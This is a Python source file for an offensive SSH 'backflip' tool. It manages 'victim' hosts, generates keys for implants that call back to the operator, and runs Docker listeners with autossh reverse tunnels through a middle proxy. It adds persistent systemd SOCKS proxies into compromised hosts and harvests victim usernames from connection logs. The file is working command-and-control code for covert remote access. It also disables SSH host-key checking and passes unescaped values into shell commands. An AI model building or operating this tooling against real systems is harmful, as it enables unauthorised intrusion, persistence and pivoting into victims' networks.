#!/usr/bin/env python3
# Copyright (c) 2026, Oracle and/or its affiliates.

import hashlib
import random
import os
import socket
import sys
import base64
import gzip
import re
import io
import ipaddress
import importlib
import shutil
import json
import subprocess
import time
from pathlib import Path
from . import settings

# ===== Utility Functions =====

def getfilehash(filename):
    sha256_hash = hashlib.sha256()
    with open(filename,"rb") as f:
        while chunk := f.read(8192):
            sha256_hash.update(chunk)
        return sha256_hash
    return None

def getfilehash_md5(filename):
    md5_hash = hashlib.md5()
    with open(filename, "rb") as f:
        while chunk := f.read(8192):
            md5_hash.update(chunk)
        return md5_hash
    return None

def getrandomwords(howmany:int):
    cleanwords = []
    with open("/usr/share/dict/words","r") as wordlist:
        dirtywords = random.sample(wordlist.read().splitlines(), howmany)
        for word in dirtywords:
            cleanwords.append(word.replace("'", "").lower())
    return cleanwords

def getfile(path):
    with open(path, "r") as f:
        return f.read()
    return None

def nocomments(stuff):
    nc = re.sub('#[^!].*$', '', stuff, 0, re.M)
    o = ""
    for l in nc.splitlines(True):
        if l.strip():
            if "log" in l:
                continue
            o += l
    return o

def templify(template, replacements):
    out = template
    for k, v in replacements.items():
        out = out.replace(k, v)
    return out

def gzbase(stuff):
    out = io.BytesIO()
    with gzip.GzipFile(fileobj=out, mode="wb") as f:
        f.write(nocomments(stuff).encode())
    return base64.b64encode(out.getvalue()).decode('utf-8')

def check_port(port, host='127.0.0.1'):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((host, port))
    if result == 0:
        return True
    else:
        return False

# ===== Core Classes =====

class BackflipManager:
    """Manages backflip instances using an SSH config file as a database."""

    def __init__(self, config_path=None):
        """Initialize the backflip manager with the SSH config database path."""
        self.config_path = config_path or settings.BACKFLIPS_DB
        self._backflips = {}
        self._ports = set()
        self._load_config()

    def _load_config(self):
        """Load and parse the SSH config file into memory."""
        self._backflips.clear()
        self._ports.clear()
        current_host = None
        current_config = {}

        try:
            with open(self.config_path, "r") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('##'):  # Skip section markers
                        continue

                    if line.startswith('Host '):
                        if current_host:
                            self._backflips[current_host] = current_config
                        current_host = line.split()[1]
                        current_config = {'Host': current_host}
                    elif line.startswith('#SOCKS '):  # Handle SOCKS proxy state
                        current_config['SOCKS'] = line.split(' ', 1)[1]
                    elif line.startswith(('User ', 'Hostname ', 'Port ', 'IdentityFile ')):
                        key, value = line.strip().split(' ', 1)
                        current_config[key] = value
                        if key == 'Port':
                            self._ports.add(int(value))

                if current_host:
                    self._backflips[current_host] = current_config

        except FileNotFoundError:
            # Create new config file if it doesn't exist
            with open(self.config_path, "w") as f:
                f.write(f"# SSH-Backflips ssh_config\n\nHost *\nControlMaster Auto\nControlPath {settings.controlMasters}/%r@%h:%p\nControlPersist 666")

    def _save_config(self):
        """Save the current configuration to file."""
        with open(f"{self.config_path}.old", "w") as f:
            with open(self.config_path, "r") as current:
                f.write(current.read())

        with open(self.config_path, "w") as f:
            f.write("# SSH-Backflips ssh_config\n\n")
            for hostname, config in self._backflips.items():
                if hostname == '*':  # Skip global settings
                    continue
                f.write(f"## SSH Backflip instance: Target Hostname: {hostname}\n")
                f.write(f"Host {hostname}\n")
                for key, value in config.items():
                    if key == 'Host':
                        continue
                    elif key == 'SOCKS':
                        f.write(f"    #SOCKS {value}\n")
                    else:
                        f.write(f"    {key} {value}\n")
                f.write(f"## End SSH Backflip instance {hostname}\n\n")

    def exists_backflip(self, backflip_name):
        """Check if a backflip instance exists."""
        return backflip_name in self._backflips

    def exists_port(self, port):
        """Check if a port is already allocated."""
        return int(port) in self._ports

    def get_available_port(self):
        """Find the next available port for a backflip instance."""
        print("Finding the next available port for an ssh backflip instance.")
        unused = {n for n in range(4001, 5000)}.difference(self._ports)
        return sorted(unused)[0]

    def locate_backflip(self, backflip_name):
        """Find the location of a backflip instance in the config file."""
        if not self.exists_backflip(backflip_name):
            return -1, -1, []

        start = -1
        end = -1
        instance_lines = []

        with open(self.config_path, "r") as f:
            lines = f.readlines()
            for i, line in enumerate(lines):
                if f"## SSH Backflip instance: Target Hostname: {backflip_name}" in line:
                    start = i
                elif start != -1 and f"## End SSH Backflip instance {backflip_name}" in line:
                    end = i
                    instance_lines = lines[start:end+1]
                    break

        return start, end, instance_lines

    def list_backflips(self):
        """List all backflip instances in the database."""
        print(f"\nListing SSH Backflip instances from database {self.config_path}:\n")
        for hostname, config in self._backflips.items():
            if hostname == '*':  # Skip global settings
                continue
            print(f"Backflip Instance: {hostname}")
            print("=" * (18 + len(hostname)))
            print(f"  Username:     {config.get('User', 'N/A')}")
            print(f"  Target Host:  {config.get('Hostname', 'N/A')}")
            print(f"  Local Port:   {config.get('Port', 'N/A')}")
            print(f"  Identity:     {config.get('IdentityFile', 'N/A')}")
            if 'SOCKS' in config:
                socks_unit = Path(config['SOCKS'])
                socks_port = int(config['Port']) - 1000
                print(f"  SOCKS Proxy:  Enabled (port {socks_port})")
                print(f"               Service: {socks_unit.name}")
            else:
                print("  SOCKS Proxy:  Disabled")
            print()

    def delete_backflip(self, backflip_name):
        """Delete a backflip instance from the database."""
        if not self.exists_backflip(backflip_name):
            print(f"Couldn't find a backflip instance with the name {backflip_name} in the database. Check the available instances with the 'list' command")
            return False

        print(f"Deleting backflip instance: {backflip_name}")
        start, end, instance = self.locate_backflip(backflip_name)

        if start == -1 or end == -1:
            return False

        # Get the port and IP for cleaning up known_hosts
        config = self._backflips[backflip_name]
        victim_port = config['Port']
        internal_ip = config['Hostname']

        # Backup the current config
        self._save_config()

        # Write the new config without the deleted instance
        with open(self.config_path, "r") as f:
            lines = f.readlines()

        with open(self.config_path, "w") as f:
            f.writelines(lines[:start] + lines[end+2:])

        # Clean up known_hosts
        os.system(f'ssh-keygen -f "/root/.ssh/known_hosts" -R "[{internal_ip}]:{victim_port}"')

        # Reload the config
        self._load_config()
        return True

    def add_backflip(self, victim):
        """Add a new backflip instance to the database."""
        if self.exists_backflip(victim.hostname):
            print(f"A backflip instance named '{victim.hostname}' already exists, select a different name.")
            return False

        if self.exists_port(victim.port):
            print(f"Port '{victim.port}' is already allocated, select a different one.")
            return False

        instance = f"""## SSH Backflip instance: Target Hostname: {victim.hostname}
Host {victim.hostname}
    User {victim.username}
    Hostname {victim.backflipServer.ip}
    Port {victim.port}
    IdentityFile {victim.privKeyPath}
## End SSH Backflip instance {victim.hostname}
\n"""

        with open(self.config_path, "a") as f:
            f.write(instance)

        # Reload the config
        self._load_config()
        return True

    def socks_on(self, backflip_name):
        """Enable SOCKS proxy for a backflip instance."""
        if not self.exists_backflip(backflip_name):
            print(f"Couldn't find a backflip instance with host name {backflip_name} in the database {self.config_path}")
            return False

        print(f"Starting SOCKS proxy for SSH Backflip target: {backflip_name}")
        config = self._backflips[backflip_name]
        internal_ip = config['Hostname']
        victim_port = int(config['Port'])
        socks_port = victim_port - 1000

        # Check if victim is connected
        if not check_port(victim_port, internal_ip):
            print(f"Victim does not appear to be connected. TCP port {victim_port} of {internal_ip} is not listening. The victim must be connected to enable the SOCKS proxy.")
            return False

        # Check if SOCKS port is available
        if check_port(socks_port, internal_ip):
            print(f"Port {socks_port} of {internal_ip} is in use, can't start the SOCKS proxy. Please release the port so backflips can use it")
            return False

        # Create systemd service unit
        systemd_unit_path = Path(f"/etc/systemd/system/backflip-socks-{backflip_name}-{victim_port}.service")
        template_unit_socks = f"""[Unit]
Description=SSH backflip SOCKS proxy to {backflip_name}
After=network.target auditd.service

[Service]
ExecStart=/usr/bin/autossh -M0 -F {self.config_path} -oServerAliveInterval=30 -oServerAliveCountMax=5 -oUserKnownHostsFile=/dev/null -oStrictHostKeyChecking=no -oBatchMode=yes -n -N -D :{socks_port} {backflip_name}
Restart=on-failure
RestartSec=30s

[Install]
WantedBy=multi-user.target
"""
        print(f"Writing systemd service unit file {systemd_unit_path}\n")
        print(f"{template_unit_socks}\n")
        with open(systemd_unit_path, "w") as f:
            f.write(template_unit_socks)

        os.system("systemctl daemon-reload")
        socks_service_name = systemd_unit_path.name

        if not os.system(f"systemctl start {socks_service_name}"):
            print(f"Failed to start the autossh SOCKS service. You may need to manually troubleshoot the service unit.")
            systemd_unit_path.unlink()
            return False

        os.system(f"systemctl enable {socks_service_name}")

        # Update config with SOCKS state
        config['SOCKS'] = str(systemd_unit_path)
        self._save_config()

        print(f"SOCKS proxy has been enabled for {backflip_name} on port {socks_port}.\n Have a nice day!")
        return True

    def socks_off(self, backflip_name):
        """Disable SOCKS proxy for a backflip instance."""
        if not self.exists_backflip(backflip_name):
            print(f"Couldn't find a backflip instance with host name {backflip_name} in the database {self.config_path}")
            return False

        print(f"Stopping SOCKS proxy for SSH Backflip target: {backflip_name}")
        config = self._backflips[backflip_name]

        if 'SOCKS' not in config:
            print(f"No SOCKS proxy found for {backflip_name}")
            return False

        systemd_unit_path = Path(config['SOCKS'])
        if not systemd_unit_path.exists():
            print(f"Couldn't find the backflip SOCKS autossh service unit file for {backflip_name} at expected path: {systemd_unit_path}")
            return False

        socks_service_name = os.path.basename(str(systemd_unit_path))
        os.system(f"systemctl stop {socks_service_name}")
        os.system(f"systemctl disable {socks_service_name}")
        systemd_unit_path.unlink()
        os.system("systemctl daemon-reload")

        # Remove SOCKS state from config
        del config['SOCKS']
        self._save_config()

        print(f"SOCKS proxy has been disabled for {backflip_name}.\n Have a nice day!")
        return True

class Server:
    def __init__(self, serverName, callbackPort = settings.BACKFLIP_PORT, callbackIP = settings.BACKFLIP_IP,
                 callbackHost = settings.BACKFLIP_SERVER, backflipUser = settings.BACKFLIP_USER):
        self.name = serverName
        self.port = callbackPort
        self.ip = callbackIP
        self.fqdn = callbackHost
        self.user = backflipUser
        self.hostKey = None
        self.hostKeyPath = f"{settings.KEYS_DIR}/{self.name}-hostkey.pub"

        # Get server's hostkey for victim's known_hosts
        os.system(f"echo \"{self.name} $(ssh-keyscan -p {self.port} -t ed25519 {self.fqdn} 2>/dev/null | cut -d ' ' -f2-)\">{self.hostKeyPath}")
        self.hostKey = getfile(self.hostKeyPath).strip()

    def __str__(self) -> str:
        return f'Server("name:{self.name}", "ip:{self.ip}", "fqdn:{self.fqdn}", "user:{self.user}", "port:{self.port}", "hostKey:{self.hostKey}"'

    def load_config(self, config):
        if self.name == 'DEFAULT':
            return

        if not config.has_section(self.name):
            print(f"The Backflips server name you provided '{self.name}' was not found in the configuration (etc/backflips.conf). You must first add a server, then you can use it")
            sys.exit(1)

        self.port = config.get(self.name, "callbackPort")
        self.ip = config.get(self.name, "internalIP")
        self.fqdn = config.get(self.name, "callbackHost")
        self.user = config.get(self.name, "callbackUser")

class Victim:
    def __init__(self, backflipServer, victimHostname, victimUsername=None, victimPort=None):
        self.username = victimUsername
        self.hostname = victimHostname
        self.port = victimPort
        self.privKeyPath = None
        self.privKey = None
        self.pubKeyPath = None
        self.pubKey = None
        self.backflipServer = backflipServer

        # Initialize the backflip manager
        self._manager = BackflipManager()

        if self.port is None:
            self.port = self._manager.get_available_port()
        if self.username is None:
            self.username = f"{getrandomwords(1)[0]}_victim"
            print(f"""\n[!!!] You didn't provide the victim username. Their username is necessary for connecting into the victim host.\n\tThe first time the backflip implant runs it will do a faceplant, aka leak the victim username through a connection attempt to the backflip server.\n\tRun `python3 sshbackflip.py backflip check-faceplant` after the implant calls back and search for locator word `{self.username.split("_")[0]}`.\n\tThen update the backflips database with that username.\n""")
        self.keygen()
        self.commit()

    def __str__(self) -> str:
        return f'Victim("username:{self.username}", "hostname:{self.hostname}", "victimPort:{self.port}")'

    def keygen(self):
        keyPath = f"{settings.KEYS_DIR}/{self.username}-{self.hostname}-{self.backflipServer.fqdn}"
        if not Path(keyPath).exists():
            print ("[*] generating new set of rsa keys")
            os.system(f"ssh-keygen -t rsa -b 2048 -C '' -q -f '{keyPath}' -N ''")
            print ("[*] adding key to authorized_keys on our backflips server")
            os.system(f"echo '' >> {settings.AUTHORIZED_KEYS}")
            os.system(f"cat '{keyPath}.pub' >> {settings.AUTHORIZED_KEYS}")
            sync_listener_authorized_keys()

        self.pubKeyPath = f"{keyPath}.pub"
        self.pubKey = getfile(self.pubKeyPath)
        self.privKeyPath = keyPath
        self.privKey = getfile(self.privKeyPath)

    def commit(self):
        if not self.privKeyPath:
            print("This victim doesn't have keys yet. You must run victim.keygen() first.")
            quit()
        self._manager.add_backflip(self)

# ===== Command Implementation Functions =====

def setup_backflip(args):
    """Implements the 'backflip new' command"""
    bfServer = 'DEFAULT' if args.backflipServer is None else args.backflipServer
    servidor = Server(bfServer)
    servidor.load_config(settings.config)
    victima = Victim(servidor, args.targetHost, args.targetUser, args.localPort)
    makeimplant(servidor, victima, args)

def list_backflips(args):
    """Implements the 'backflip list' command"""
    manager = BackflipManager()
    manager.list_backflips()

def delete_backflip(args):
    """Implements the 'backflip delete' command"""
    manager = BackflipManager()
    manager.delete_backflip(args.targetHost)

def connect_backflip(args):
    """Implements the 'backflip connect' command"""
    manager = BackflipManager()
    if manager.exists_backflip(args.targetHost):
        print(f"Connecting to SSH Backflip target: {args.targetHost}")
        os.system(f"ssh -F {settings.BACKFLIPS_DB} {args.targetHost}")
    else:
        print(f"Couldn't find a backflip instance with host name {args.targetHost} in the database {settings.BACKFLIPS_DB}")

def manage_socks(args):
    """Implements the 'backflip socks' command"""
    manager = BackflipManager()
    if args.socksToggle:
        manager.socks_on(args.targetHost)
    elif args.socksToggle is False:
        manager.socks_off(args.targetHost)

def check_faceplant(args):
    """Search managed listener container logs for faceplant username leaks."""
    import datetime

    manager = BackflipManager()

    if args.searchDate:
        try:
            search_date = datetime.datetime.strptime(args.searchDate, "%Y-%m-%d").strftime("%Y-%m-%d")
        except ValueError:
            print("Error: Date must be in YYYY-MM-DD format")
            return
    else:
        search_date = datetime.date.today().strftime("%Y-%m-%d")

    print(f"Searching listener container logs from {search_date} onwards...")

    for hostname, config in manager._backflips.items():
        if hostname == '*':
            continue

        username = config.get('User', '')
        if not username or '_victim' not in username:
            continue

        search_word = username.split('_')[0]
        for listener_name in settings.config.sections():
            try:
                logs = subprocess.run(
                    ["docker", "logs", "--since", search_date, f"backflip_{listener_id(listener_name)}"],
                    capture_output=True,
                    text=True,
                )
            except OSError:
                continue
            if logs.returncode != 0:
                continue

            for line in (logs.stdout + logs.stderr).splitlines():
                match = re.search(fr'user {re.escape(search_word)}-(\w+)', line)
                if match:
                    leaked_user = match.group(1)
                    if leaked_user != username:
                        print(f"\nFound potential username leak for {hostname}:")
                        print(f"Current username in database: {username}")
                        print(f"Leaked username from logs: {leaked_user}")

                        response = input(f"\nDo you want to update the username for {hostname} to {leaked_user}? (y/n): ")
                        if response.lower() == 'y':
                            config['User'] = leaked_user
                            manager._save_config()
                            print(f"Updated username for {hostname} to {leaked_user}")
                        break

    print("\nFaceplant check completed.")

# ===== Listener Management Functions =====

def manage_servers(args):
    """Implements the 'listener' command."""
    if args.serverAction == "list":
        list_servers()
    elif args.serverAction == "add":
        add_server(
            args.name,
            args.callbackHost,
            args.callbackPort,
            args.callbackUser,
            args.middleIP,
            args.middleUser,
            args.middleKeyPath,
        )
    elif args.serverAction == "delete":
        remove_server(args.name)
    else:
        print("Unknown action for managing backflip servers")
        sys.exit(1)

def listener_id(name):
    """Return a Docker-safe listener identifier."""
    slug = re.sub(r'[^a-z0-9]+', '-', name.strip().lower()).strip('-')
    if not slug:
        raise ValueError("Listener name must contain at least one letter or number")
    return slug

def listener_project_dir(name):
    return settings.CONTAINERS_DIR / listener_id(name)

def listener_compose_path(name):
    return listener_project_dir(name) / "docker-compose.yml"

def listener_project_name(name):
    return f"backflip-{listener_id(name)}"

def listener_config_dir(name):
    return settings.BACKFLIPS_BASE_DIR / "etc" / "ssh" / listener_id(name)

def sync_listener_authorized_keys(config=settings.config):
    """Atomically propagate the canonical victim keys to managed listeners."""
    for name in config.sections():
        authorized_keys = listener_config_dir(name) / ".ssh" / "authorized_keys"
        if not authorized_keys.parent.is_dir():
            continue
        temporary_path = authorized_keys.with_name(f"{authorized_keys.name}.tmp")
        shutil.copyfile(settings.AUTHORIZED_KEYS, temporary_path)
        temporary_path.chmod(0o600)
        temporary_path.replace(authorized_keys)

def _docker_compose(name, *args, check=True):
    return subprocess.run(
        [
            "docker",
            "compose",
            "--project-name",
            listener_project_name(name),
            "--file",
            str(listener_compose_path(name)),
            *args,
        ],
        capture_output=True,
        text=True,
        check=check,
    )

def render_listener_compose(name, callback_host, callback_port, callback_user, middle_ip, middle_user, middle_key_path):
    """Render a single-listener Compose project as JSON, which Compose accepts as YAML."""
    slug = listener_id(name)
    listener_service = f"backflip_{slug}"
    listener_alias = f"listener-{slug}"
    autossh_service = f"autossh_{slug}"
    network_name = f"listener_{slug}"
    compose = {
        "services": {
            listener_service: {
                "image": "lscr.io/linuxserver/openssh-server:latest",
                "container_name": listener_service,
                "hostname": listener_service,
                "environment": {
                    "PUID": "0",
                    "PGID": "0",
                    "TZ": "Etc/UTC",
                    "PUBLIC_KEY_FILE": "/config/.ssh/authorized_keys",
                    "USER_NAME": callback_user,
                    "LOG_STDOUT": "true",
                },
                "volumes": [f"{listener_config_dir(name)}:/config"],
                "expose": ["2222"],
                "networks": {
                    network_name: {
                        "aliases": [listener_alias],
                    },
                },
                "restart": "unless-stopped",
            },
            autossh_service: {
                "build": {
                    "context": str(settings.CONTAINERS_DIR),
                    "dockerfile": "Dockerfile",
                },
                "container_name": autossh_service,
                "hostname": autossh_service,
                "volumes": [f"{middle_key_path}:/config/sshd/middle_key:ro"],
                "networks": [network_name],
                "tty": True,
                "restart": "unless-stopped",
                "command": [
                    "autossh",
                    "-N",
                    "-M",
                    "0",
                    "-o",
                    "ExitOnForwardFailure=yes",
                    "-o",
                    "ServerAliveInterval=30",
                    "-o",
                    "ServerAliveCountMax=3",
                    "-o",
                    "StrictHostKeyChecking=no",
                    "-o",
                    "UserKnownHostsFile=/dev/null",
                    "-R",
                    f"{callback_port}:{listener_alias}:2222",
                    "-i",
                    "/config/sshd/middle_key",
                    "-o",
                    f"ProxyCommand=ssh -i /config/sshd/middle_key -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {middle_user}@{middle_ip} nc %h %p",
                    f"{middle_user}@{callback_host}",
                ],
                "depends_on": [listener_service],
            },
        },
        "networks": {
            network_name: {
                "driver": "bridge",
            },
        },
    }
    return json.dumps(compose, indent=2) + "\n"

def create_listener_project(name, callback_host, callback_port, callback_user, middle_ip, middle_user, middle_key_path):
    """Create and start the per-listener Compose project, then return its container IP."""
    project_dir = listener_project_dir(name)
    compose_path = listener_compose_path(name)
    config_dir = listener_config_dir(name)
    dockerfile_src = Path(__file__).parent / "container_assets" / "Dockerfile"
    dockerfile_dst = settings.CONTAINERS_DIR / "Dockerfile"
    sshd_config_src = Path(__file__).parent / "container_assets" / "sshd_config"
    middle_key = Path(middle_key_path)

    if not middle_key.exists():
        raise FileNotFoundError(f"Middle proxy SSH key does not exist: {middle_key_path}")

    settings.CONTAINERS_DIR.mkdir(parents=True, exist_ok=True)
    project_dir.mkdir(parents=True, exist_ok=False)
    (config_dir / "sshd").mkdir(parents=True, exist_ok=False)
    (config_dir / ".ssh").mkdir()
    shutil.copyfile(dockerfile_src, dockerfile_dst)
    shutil.copyfile(sshd_config_src, config_dir / "sshd" / "sshd_config")
    shutil.copyfile(settings.AUTHORIZED_KEYS, config_dir / ".ssh" / "authorized_keys")
    (config_dir / ".ssh" / "authorized_keys").chmod(0o600)
    compose_path.write_text(
        render_listener_compose(
            name,
            callback_host,
            callback_port,
            callback_user,
            middle_ip,
            middle_user,
            middle_key_path,
        )
    )

    try:
        _docker_compose(name, "up", "--detach", "--build")
        return wait_for_listener_runtime(name)
    except Exception:
        try:
            _docker_compose(name, "down", "--remove-orphans", check=False)
        except OSError:
            pass
        shutil.rmtree(project_dir, ignore_errors=True)
        shutil.rmtree(config_dir, ignore_errors=True)
        raise

def container_status(container_name, include_ip=False):
    """Return one managed container's status and optional IP address."""
    output_format = "{{.State.Status}}"
    if include_ip:
        output_format += " {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}"
    try:
        inspect = subprocess.run(
            [
                "docker",
                "inspect",
                "--format",
                output_format,
                container_name,
            ],
            capture_output=True,
            text=True,
        )
    except OSError:
        return "unavailable", ""
    if inspect.returncode != 0:
        return "missing", ""
    parts = inspect.stdout.strip().split(maxsplit=1)
    if not parts:
        return "unknown", ""
    return parts[0], parts[1] if len(parts) > 1 else ""

def listener_status(name):
    """Return combined listener/autossh status and the listener IP address."""
    slug = listener_id(name)
    listener_state, container_ip = container_status(f"backflip_{slug}", include_ip=True)
    autossh_state, _ = container_status(f"autossh_{slug}")
    if listener_state == "running" and autossh_state == "running":
        return "running", container_ip
    if listener_state == "missing" and autossh_state == "missing":
        return "missing", ""
    return f"degraded (listener={listener_state}, autossh={autossh_state})", container_ip

def wait_for_listener_runtime(name, attempts=5, interval=1):
    """Require two consecutive healthy observations before accepting startup."""
    consecutive_healthy = 0
    last_status = "unknown"
    for attempt in range(attempts):
        last_status, container_ip = listener_status(name)
        if last_status == "running" and container_ip:
            consecutive_healthy += 1
            if consecutive_healthy == 2:
                return container_ip
        else:
            consecutive_healthy = 0
        if attempt + 1 < attempts:
            time.sleep(interval)
    raise RuntimeError(f"Listener runtime did not become healthy: {last_status}")

def list_servers(config = settings.config):
    """Helper function to list configured listeners in a human-readable format."""
    print("\nConfigured SSH Backflip Listeners:\n")
    for server in config.sections():
        status, container_ip = listener_status(server)
        print(f"Listener name: {server}")
        print("=" * (9 + len(server)))
        for key, value in config.items(server):
            if key == "callbackhost":
                print(f"  Public Address: {value}")
            elif key == "internalip":
                print(f"  Internal IP:    {value}")
            elif key == "callbackport":
                print(f"  Listen Port:    {value}")
            elif key == "callbackuser":
                print(f"  Auth User:      {value}")
            else:
                print(f"  {key}: {value}")
        print(f"  Container:     {status}")
        if container_ip:
            print(f"  Container IP:  {container_ip}")
        print()

def add_server(name, callbackHost, callbackPort, callbackUser, middleIP=None, middleUser=None, middleKeyPath=None, config = settings.config):
    """Create a container-managed listener and persist its runtime details."""
    fqdn_pattern = re.compile(r"^(?=.{1,253}$)(?:[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?\.)+[A-Za-z]{2,63}$")
    try:
        callbackHost = str(ipaddress.ip_address(callbackHost))
    except ValueError:
        if not fqdn_pattern.match(callbackHost):
            print(f"This is not a valid callback FQDN or IP address: {callbackHost}")
            sys.exit(1)

    try:
        validated_port = int(callbackPort)
        if validated_port < 1 or validated_port > 65535:
            raise ValueError
    except ValueError:
        print(f"This is not a valid TCP port: {callbackPort}")
        sys.exit(1)

    resolved_middle_ip = middleIP or settings.MIDDLE_IP
    resolved_middle_user = middleUser or settings.MIDDLE_USER
    resolved_middle_key_path = middleKeyPath or settings.MIDDLE_KEY_PATH
    if not resolved_middle_ip:
        print("You must provide a middle proxy IP with --middle-ip or middleIP in backflips.conf")
        sys.exit(1)
    try:
        resolved_middle_ip = str(ipaddress.ip_address(resolved_middle_ip))
    except ValueError:
        print(f"This is not a valid middle proxy IP address: {resolved_middle_ip}")
        sys.exit(1)

    if config.has_section(name):
        print(f"Couldn't add new server with name {name}: it already exists")
        sys.exit(1)
    for existing_name in config.sections():
        if listener_id(existing_name) == listener_id(name):
            print(f"Couldn't add new server with name {name}: it conflicts with existing listener {existing_name}")
            sys.exit(1)

    try:
        internal_ip = create_listener_project(
            name,
            callbackHost,
            str(validated_port),
            callbackUser,
            resolved_middle_ip,
            resolved_middle_user,
            resolved_middle_key_path,
        )
    except Exception as exc:
        print(f"Couldn't create listener containers for {name}: {exc}")
        sys.exit(1)

    config.add_section(name)
    config.set(name, "callbackHost", callbackHost)
    config.set(name, "internalIP", internal_ip)
    config.set(name, "callbackPort", str(validated_port))
    config.set(name, "callbackUser", callbackUser)
    config.set(name, "middleIP", resolved_middle_ip)
    config.set(name, "middleUser", resolved_middle_user)
    config.set(name, "middleKeyPath", resolved_middle_key_path)
    try:
        commit_server_config(config)
    except BaseException:
        config.remove_section(name)
        try:
            _docker_compose(name, "down", "--remove-orphans", check=False)
        except OSError:
            pass
        shutil.rmtree(listener_project_dir(name), ignore_errors=True)
        shutil.rmtree(listener_config_dir(name), ignore_errors=True)
        raise
    print(f"Server {name} has been added to backflips.conf and started with container IP {internal_ip}")

def remove_server(name, config = settings.config):
    """Stop and remove a listener project before removing its config."""
    project_dir = listener_project_dir(name)
    config_dir = listener_config_dir(name)
    if listener_compose_path(name).exists():
        try:
            _docker_compose(name, "down", "--remove-orphans")
        except (OSError, subprocess.CalledProcessError) as exc:
            detail = getattr(exc, "stderr", "") or str(exc)
            print(f"Could not stop listener containers for {name}: {detail.strip()}")
            sys.exit(1)

    shutil.rmtree(project_dir, ignore_errors=True)
    shutil.rmtree(config_dir, ignore_errors=True)
    if not config.has_section(name):
        print(f"Listener {name} was not found in backflips.conf; removed any matching compose project.")
        return

    config.remove_section(name)
    commit_server_config(config)
    print(f"Server {name} has been deleted from backflips.conf")

def commit_server_config(config = settings.config, configPath = settings.configPath):
    """Helper function to save listener configuration changes"""
    try:
        shutil.copyfile(configPath, f"{configPath}.backup")
    except:
        print("Couldn't make configuration backup before modification")
        sys.exit(1)

    with open(configPath, "w") as configFile:
        config.write(configFile)

# ===== Implant Generation =====

def makeimplant(backflipServer, victim, args):
    """Helper function to generate OS-specific implant"""
    implantMod = importlib.import_module(f"sshbackflip.{args.targetOS}")
    implantMod.makebackflip(backflipServer, victim, args)
